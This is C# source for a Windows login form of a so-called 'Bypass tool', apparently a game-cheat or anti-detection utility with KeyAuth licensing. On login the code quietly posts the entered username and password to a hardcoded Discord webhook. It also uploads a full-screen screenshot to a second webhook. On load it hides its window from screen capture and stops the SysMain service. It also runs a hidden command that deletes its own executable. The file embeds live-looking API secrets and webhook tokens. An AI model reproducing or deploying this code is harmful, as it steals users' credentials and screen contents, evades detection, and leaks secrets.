using DiscordMessenger;
using KeyAuth;
using Newtonsoft.Json;
using Siticone.Desktop.UI.WinForms;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;


namespace oficial_version
{
    public partial class Ghost1 : Form
    {
        public static api KeyAuthApp = new api(
    name: "Bypass tool",
    ownerid: "oPy9xx1KTm",
    secret: "0ba9db0592df607dbef77ae1742cdce2e277a989d9433b4362cf1cf13698a6b5",
    version: "1.0"
);
        public Ghost1()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            this.DoubleBuffered = true;
            this.SetStyle(ControlStyles.ResizeRedraw, true);
            if (Process.GetProcessesByName("mmc").Length == 0)
            {
                this.Close();
            }

        }
        bool dnspy = false;
        

        public static void BoyCrack2()
        {
            try
            {
                var computadortela = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

                var arquivoDestino = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var g = Graphics.FromImage(arquivoDestino);

                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), computadortela);

                var nomeArquivo = @"C:\Windows\Temp\login.png";

                arquivoDestino.Save(nomeArquivo, ImageFormat.Png);
                MultipartFormDataContent content = new MultipartFormDataContent();

                var file = File.ReadAllBytes(nomeArquivo);
                content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(nomeArquivo), nomeArquivo);
                SendImg("https://discord.com/api/webhooks/1128385106491478016/ryxsMg7rzigBQN2zFERQaOh5MWNPgbgNtNVNBa02uH3xuQpCZHncxGMnAwIcdAg6AnWa", nomeArquivo);
            }
            catch
            {

            }
        }

        public static void BoyCrack()
        {
            try
            {

                var computadortela = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

                var arquivoDestino = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var g = Graphics.FromImage(arquivoDestino);

                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), computadortela);

                var nomeArquivo = @"C:\Windows\Temp\crack.png";

                arquivoDestino.Save(nomeArquivo, ImageFormat.Png);
                MultipartFormDataContent content = new MultipartFormDataContent();

                var file = File.ReadAllBytes(nomeArquivo);
                content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(nomeArquivo), nomeArquivo);
                SendImg("https://discord.com/api/webhooks/1128385106491478016/ryxsMg7rzigBQN2zFERQaOh5MWNPgbgNtNVNBa02uH3xuQpCZHncxGMnAwIcdAg6AnWa", nomeArquivo);

            }
            catch
            {

            }
        }

        private static void SendImg(string url, string filePath)
        {
            HttpClient client = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();

            var file = File.ReadAllBytes(filePath);
            content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            client.PostAsync(url, content).Wait();
            client.Dispose();
        }




        private async void siticoneButton1_Click(object sender, EventArgs e)
        {
                            await Task.Run(() =>
            {
                KeyAuthApp.login(user.Text, senha.Text);
               
            });
            if (KeyAuthApp.response.success)
            {
                string username = user.Text;
                string pass = senha.Text;
                string webhook = "https://discord.com/api/webhooks/1128384867734925313/g6sD-WfOm5mou19ffssKq1UR1e5Ni4cugjMwKHPdJ3siIbXFHUMy9mdh2UaUghn_KNiJ";
                var embed = new
                {
                    title = $"`🔎`  Usuario Logado - {username} bypass skript ", 
                    description = $"**Username:** {user} \n\n **Password:** {pass} \n\n",
                    color = 1250582,
                    footer = new
                    {
                        text = ""
                    }
                };

                var payload = new
                {
                    username = "sexo Bypass",
                    avatar_url = "https://cdn.discordapp.com/attachments/1089620060877885463/1089629048868720660/B8.png",
                    embeds = new[] { embed }
                };

                using (HttpClient client = new HttpClient())
                {
                    var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                    var result = client.PostAsync(webhook, content).GetAwaiter().GetResult();
                }
                BoyCrack2();
                // Abre o formulário "MorningMain"
                Ghost2 MorningLoad = new Ghost2();
                MorningLoad.Show();

                // Define a posição do formulário "MorningMain" com base na posição do formulário "MorningLogin"
                int x = this.Location.X;
                int y = this.Location.Y;
                MorningLoad.Location = new Point(x, y);

                // Adiciona um manipulador de eventos para o evento FormClosed do formulário "MorningMain"
                this.Hide();
            }
            
        }

        bool mover = false;
        Point posicao_inicial;

        private void geral_MouseDown(object sender, MouseEventArgs e)
        {
            mover = true;
            posicao_inicial = new Point(e.X, e.Y);
            this.Opacity = 0.7;
        }

        private void geral_MouseUp(object sender, MouseEventArgs e)
        {
            mover = false;
            this.Opacity = 1.0;
        }

        private void geral_MouseMove(object sender, MouseEventArgs e)
        {
            if (mover)
            {
                Point novo = PointToScreen(e.Location);
                Location = new Point(novo.X - this.posicao_inicial.X, novo.Y - this.posicao_inicial.Y);
                this.Opacity = 0.7;
            }
        }

   

        private void siticonePanel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void senha_TextChanged(object sender, EventArgs e)
        {

        }

        private static string GetHardwareID()
        {
            string hwid = Guid.NewGuid().ToString();
            return hwid;
        }

        private void hwidcheck()
        {
            string hwid = GetHardwareID();
            string filePath = Path.Combine(Path.GetTempPath(), $"glauber");
            if (File.Exists(filePath) && File.ReadAllText(filePath) != hwid)
            {
                MessageBox.Show("Your Hwid has been banned.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                string cmdCommand = "echo Your account is banned > banned.txt";
                ProcessStartInfo cmdStartInfo = new ProcessStartInfo("cmd.exe", "/c " + cmdCommand);
                Process cmdProcess = new Process();
                cmdProcess.StartInfo = cmdStartInfo;
                cmdProcess.Start();
                string filePath2 = Application.ExecutablePath;
                string arguments = "/c ping 1.1.1.1 -n 1 -w 3000 > Nul & Del " + filePath2;
                ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", arguments);
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(startInfo);
                Environment.Exit(0);
            }
        }

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool GetAsyncKeyState(int vKey);
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern short GetKeyState(int keyCode);
        [DllImport("user32.dll")]
        public static extern uint SetWindowDisplayAffinity(IntPtr hwnd, uint dwAffinity);
        private bool visivel = true;
        const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011; //ativa

        private void Ghost1_Load(object sender, EventArgs e)
        {
            SetWindowDisplayAffinity(this.Handle, WDA_EXCLUDEFROMCAPTURE);

            hwidcheck();
            // Obter o caminho completo para a pasta Temp do sistema
            string tempFolder = Path.GetTempPath();

            // Criar o caminho completo para o arquivo de texto "login.txt" na pasta Temp
            string filePath = Path.Combine(tempFolder, "duajydjyajyd.json");

            // Verificar se o arquivo de texto existe antes de tentar lê-lo
            if (File.Exists(filePath))
            {
                // Criar uma nova instância de StreamReader para ler os dados do arquivo de texto
                using (StreamReader sr = new StreamReader(filePath))
                {
                    // Ler a primeira linha do arquivo (contendo o nome de usuário)
                    string usernameLine = sr.ReadLine();

                    // Ler a segunda linha do arquivo (contendo a senha)
                    string passwordLine = sr.ReadLine();

                    // Extrair o nome de usuário e senha a partir das linhas lidas
                    string username = usernameLine.Replace("Username: ", "");
                    string password = passwordLine.Replace("Password: ", "");

                    // Preencher as caixas de texto com o nome de usuário e senha lidos
                    user.Text = username;
                    senha.Text = password;
                }
            }
            Thread.Sleep(1000);
            Process process = new Process();
            process.StartInfo.FileName = "sc.exe";
            process.StartInfo.Arguments = "stop sysmain";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            Thread.Sleep(1000);
            KeyAuthApp.init();
        }

        private void siticoneButton2_Click(object sender, EventArgs e)
        {
            Ghost3 main = new Ghost3();
            main.Show();
        }

        private void siticoneCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            string tempFolder = Path.GetTempPath();
            string filePath = Path.Combine(tempFolder, "duajydjyajyd.json");
            if (!siticoneCheckBox1.Checked)
            {
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }
            }
            else
            {
                string gordo = user.Text;
                string gordo2 = senha.Text;

                using (StreamWriter sw = new StreamWriter(filePath))
                {
                    sw.WriteLine("Username: " + gordo);
                    sw.WriteLine("Password: " + gordo2);
                }
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
